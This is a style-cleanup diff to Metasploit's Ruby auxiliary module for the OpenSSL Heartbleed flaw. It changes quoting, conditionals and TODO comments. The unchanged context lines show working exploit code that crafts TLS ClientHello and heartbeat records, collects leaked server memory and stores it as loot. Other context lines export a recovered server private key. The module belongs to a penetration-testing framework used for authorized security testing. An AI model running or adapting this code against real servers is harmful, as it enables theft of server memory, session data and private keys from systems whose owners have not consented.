@@ -173,7 +173,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     if heartbeat_length > 65535 || heartbeat_length < 0
-      print_error("HEARTBEAT_LENGTH should be a natural number less than 65536")
+      print_error('HEARTBEAT_LENGTH should be a natural number less than 65536')
       return
     end
 
@@ -319,7 +319,7 @@ class Metasploit3 < Msf::Auxiliary
     when 'DUMP'
       loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
     when 'KEYS'
-      getkeys()
+      getkeys
     else
       #Shouldn't get here, since Action is Enum
       print_error("Unknown Action: #{action.name}")
@@ -349,11 +349,13 @@ class Metasploit3 < Msf::Auxiliary
       alert_unp = res.unpack('CC')
       alert_level = alert_unp[0]
       alert_desc = alert_unp[1]
-      msg = 'Unknown error'
+
       # http://tools.ietf.org/html/rfc5246#section-7.2
       case alert_desc
       when 0x46
         msg = 'Protocol error. Looks like the chosen protocol is not supported.'
+      else
+        msg = 'Unknown error'
       end
       vprint_error("#{peer} - #{msg}")
       return
@@ -368,12 +370,10 @@ class Metasploit3 < Msf::Auxiliary
     heartbeat_data = ''
     while to_receive > 0
       temp = sock.get_once(to_receive, response_timeout)
-      if temp.nil?
-        break
-      else
-        to_receive -= temp.length
-        heartbeat_data << temp
-      end
+      break if temp.nil?
+
+      to_receive -= temp.length
+      heartbeat_data << temp
     end
     vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{len} bytes (expected #{heartbeat_length} bytes)")
 
@@ -404,12 +404,12 @@ class Metasploit3 < Msf::Auxiliary
         match_data = heartbeat_data
       end
       path = store_loot(
-        "openssl.heartbleed.server",
-        "application/octet-stream",
+        'openssl.heartbleed.server',
+        'application/octet-stream',
         rhost,
         match_data,
         nil,
-        "OpenSSL Heartbleed server memory"
+        'OpenSSL Heartbleed server memory'
       )
       print_status("#{peer} - Heartbeat data stored in #{path}")
     end
@@ -450,12 +450,12 @@ class Metasploit3 < Msf::Auxiliary
 
         print_status(key.export)
         path = store_loot(
-          "openssl.heartbleed.server",
-          "text/plain",
+          'openssl.heartbleed.server',
+          'text/plain',
           rhost,
           key.export,
           nil,
-          "OpenSSL Heartbleed Private Key"
+          'OpenSSL Heartbleed Private Key'
         )
         print_status("#{peer} - Private key stored in #{path}")
         return
@@ -477,12 +477,12 @@ class Metasploit3 < Msf::Auxiliary
     time_temp = Time.now
     time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i
 
-    hello_data = [TLS_VERSION[datastore['TLS_VERSION']]].pack("n") # Version TLS
-    hello_data << [time_epoch].pack("N")    # Time in epoch format
+    hello_data = [TLS_VERSION[datastore['TLS_VERSION']]].pack('n') # Version TLS
+    hello_data << [time_epoch].pack('N')    # Time in epoch format
     hello_data << Rex::Text.rand_text(28)   # Random
     hello_data << "\x00"                    # Session ID length
-    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
-    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites
+    hello_data << [CIPHER_SUITES.length * 2].pack('n') # Cipher Suites length (102)
+    hello_data << CIPHER_SUITES.pack('n*')  # Cipher Suites
     hello_data << "\x01"                    # Compression methods length (1)
     hello_data << "\x00"                    # Compression methods: null
 
@@ -490,11 +490,11 @@ class Metasploit3 < Msf::Auxiliary
     hello_data_extensions << "\x00\x01"     # Extension length
     hello_data_extensions << "\x01"         # Extension data
 
-    hello_data << [hello_data_extensions.length].pack("n")
+    hello_data << [hello_data_extensions.length].pack('n')
     hello_data << hello_data_extensions
 
     data = "\x01\x00"                      # Handshake Type: Client Hello (1)
-    data << [hello_data.length].pack("n")  # Length
+    data << [hello_data.length].pack('n')  # Length
     data << hello_data
 
     ssl_record(HANDSHAKE_RECORD_TYPE, data)
@@ -552,6 +552,7 @@ class Metasploit3 < Msf::Auxiliary
       vprint_debug("\tHandshake ##{handshake_count}:")
       vprint_debug("\t\tLength: #{hs_len}")
 
+      handshake_parsed = nil
       case hs_type
         when HANDSHAKE_SERVER_HELLO_TYPE
           vprint_debug("\t\tType:   Server Hello (#{hs_type})")
@@ -593,6 +594,7 @@ class Metasploit3 < Msf::Auxiliary
     vprint_debug("\t\tServer Hello Session ID:        #{session_id}")
     # TODO Read the rest of the server hello (respect message length)
 
+    # TODO: return hash with data
     true
   end
 
@@ -626,6 +628,7 @@ class Metasploit3 < Msf::Auxiliary
       already_read = already_read + single_cert_len + 3
     end
 
+    # TODO: return hash with data
     true
   end
 
@@ -634,13 +637,13 @@ class Metasploit3 < Msf::Auxiliary
     record << data
   end
 
-  def get_ne()
+  def get_ne
     unless @cert
       print_error("#{peer} - No certificate found")
       return
     end
 
-    return @cert.public_key.params["n"], @cert.public_key.params["e"]
+    return @cert.public_key.params['n'], @cert.public_key.params['e']
   end
 
   def get_factors(data, n)
